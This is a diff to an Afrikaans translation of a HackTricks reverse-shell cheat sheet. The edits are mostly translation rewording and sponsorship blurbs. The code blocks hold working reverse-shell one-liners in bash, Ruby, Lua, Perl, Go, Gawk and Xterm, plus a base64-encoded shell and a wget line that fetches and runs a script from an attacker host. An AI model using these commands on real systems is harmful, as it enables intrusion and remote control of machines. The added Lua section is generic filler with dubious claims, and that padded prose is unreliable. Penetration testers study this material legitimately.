@@ -6,17 +6,17 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-**Probeer Hard Security Group**
+**Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -58,7 +58,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 2. **`>&`**: Hierdie deel van die bevel is 'n kort notasie vir die **omleiding van beide standaard uitvoer** (`stdout`) en **standaard fout** (`stderr`) na dieselfde bestemming.
 3. **`/dev/tcp/<AANVALLER-IP>/<POORT>`**: Dit is 'n spesiale lêer wat 'n TCP-verbinding met die gespesifiseerde IP-adres en poort **voorstel**.
 * Deur **die uitset- en foutstrome na hierdie lêer om te lei**, stuur die bevel effektief die uitset van die interaktiewe skul-sessie na die aanvaller se masjien.
-4. **`0>&1`**: Hierdie deel van die bevel **lei standaard inset (`stdin`) om na dieselfde bestemming as standaard uitvoer (`stdout`)**.
+4. **`0>&1`**: Hierdie deel van die bevel **lei standaard inset (`stdin`) na dieselfde bestemming as standaard uitvoer (`stdout`) om**.
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
@@ -97,9 +97,10 @@ En dan kan jy hardloop:
 ```shell
 toboggan -m nix.py -i
 ```
-Om direk 'n interaktiewe skaal te benut. Jy kan `-b` byvoeg vir Burpsuite-integrasie en die `-i` verwyder vir 'n meer basiese rce-omsluier.
+Om direk 'n interaktiewe dop te benut. Jy kan `-b` byvoeg vir Burpsuite-integrasie en die `-i` verwyder vir 'n meer basiese rce-omhulsel.
 
-'n Ander moontlikheid is om die `IppSec` voorwaartse skaal implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+
+'n Ander moontlikheid is om die `IppSec` forward shell-implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Jy hoef net te wysig:
 
@@ -107,7 +108,7 @@ Jy hoef net te wysig:
 * Die voorvoegsel en agtervoegsel van jou lading (indien enige)
 * Die manier waarop die lading gestuur word (koppe? data? ekstra inligting?)
 
-Dan kan jy net **bevele stuur** of selfs die `upgrade` bevel gebruik om 'n volledige PTY te kry (let daarop dat pype gelees en geskryf word met 'n benaderde vertraging van 1.3s).
+Dan kan jy net **bevele stuur** of selfs die `upgrade` bevel gebruik om 'n volledige PTY te kry (let daarop dat pype met 'n benaderde vertraging van 1.3s gelees en geskryf word).
 
 ## Netcat
 ```bash
@@ -157,12 +158,14 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PO
 ```
 ## Ruby
 
-Ruby is 'n dinamiese, reflektiewe, objek-georiënteerde programmeertaal wat dikwels gebruik word vir webontwikkeling. Dit bied 'n kragtige skryftaal met 'n eenvoudige sintaksis wat dit maklik maak om te leer en te gebruik. Ruby het 'n groot gemeenskap van ontwikkelaars wat bydra tot die biblioteke en raamwerke wat beskikbaar is vir die taal.
+Ruby is 'n dinamiese, reflektiewe, objek-georiënteerde programmeertaal wat dikwels gebruik word vir webontwikkeling. Dit bied 'n kragtige skakel na die Unix-stelsel, wat dit 'n gewilde keuse maak vir skel-programmering. Die volgende is 'n paar nuttige skeltegnieke wat spesifiek is vir Ruby:
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
+
+PHP is a popular server-side scripting language that is widely used for web development. It can be embedded into HTML code or used in combination with various web template systems, web content management systems, and web frameworks. PHP scripts are executed on the server, generating HTML content that is then sent to the client's web browser. PHP can also be used for command-line scripting and writing desktop applications.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -191,7 +194,21 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 ## Lua
 
-Lua is 'n kragtige, effektiewe, en vinnige skriptaal wat dikwels gebruik word vir die skryf van skakelbare en aanpasbare sagteware. Lua word dikwels gebruik vir die ontwikkeling van speletjies, webtoepassings, en selfs vir die konfigurasie van groot sagtewaretoepassings. Lua is maklik om te leer en te gebruik, en dit bied 'n groot verskeidenheid biblioteke en raamwerke vir ontwikkelaars om van te kies. Lua kan ook geïntegreer word met ander programmeertaale, wat dit 'n veelsydige en aanpasbare opsie maak vir ontwikkelaars.
+### Inleiding
+
+Lua is 'n kragtige, effektiewe, klein, en aanpasbare skrips taal wat dikwels gebruik word in die wêreld van hacking en sagteware-ontwikkeling. Lua kan gebruik word om sagteware te skryf, data te manipuleer, en selfs om ander programme te integreer. Die taal is maklik om te leer en bied 'n groot verskeidenheid funksies en biblioteke wat dit 'n gewilde keuse maak vir hackers en ontwikkelaars.
+
+### Lua in Hacking
+
+In die hacking-wêreld word Lua dikwels gebruik vir die skryf van skadelike skrifte, bots, en selfs vir die ontwikkeling van hacking tools. Die aanpasbaarheid en krag van Lua maak dit 'n waardevolle hulpmiddel vir hackers wat hul eie gereedskap wil skep vir verskeie doeleindes, soos netwerkpenetrasiestoetse, data-ontginning, en selfs sosiale ingenieurswese.
+
+### Lua in Linux
+
+Linux-stelsels bied 'n omgewing waarin Lua vlot kan hardloop en geïntegreer kan word met verskeie ander programme en hulpmiddels. Dit maak dit 'n gunsteling onder hackers wat Linux gebruik vir hul projekte en aanvalle. Lua kan gebruik word vir die outomatiese uitvoering van take, die manipulasie van data, en selfs vir die skep van aangepaste skrifte vir spesifieke doeleindes.
+
+### Lua-bronne
+
+As jy belangstel in die gebruik van Lua vir hacking of sagteware-ontwikkeling, is daar 'n verskeidenheid bronne beskikbaar om jou te help om die taal te leer en te meester. Dit sluit in tutoriale, dokumentasie, en gemeenskapsforums waar jy vrae kan vra en inligting kan deel met mede-gebruikers. Met die regte bronne en oefening kan jy vinnig vaardigheid verwerf in die gebruik van Lua vir jou hacking-projekte.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -291,7 +308,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk is 'n kragtige patroonvergelykingstaal wat dikwels gebruik word vir data-manipulasie en tekstverwerking. Dit kan ook gebruik word vir die skep van skripte en is baie nuttig vir die outomatiseer van take in 'n Linux-omgewing.
+Gawk is 'n kragtige patroonvergelykingstaal wat dikwels gebruik word vir data-manipulasie en tekstverwerking. Dit kan ook gebruik word vir netwerk- en stelseladministrasie take.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -316,7 +333,7 @@ close(Service)
 ```
 ## Xterm
 
-Dit sal probeer om met jou stelsel te verbind by poort 6001:
+Dit sal probeer om na jou stelsel by poort 6001 te verbind:
 ```bash
 xterm -display 10.0.0.1:1
 ```
@@ -345,7 +362,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -357,7 +374,7 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
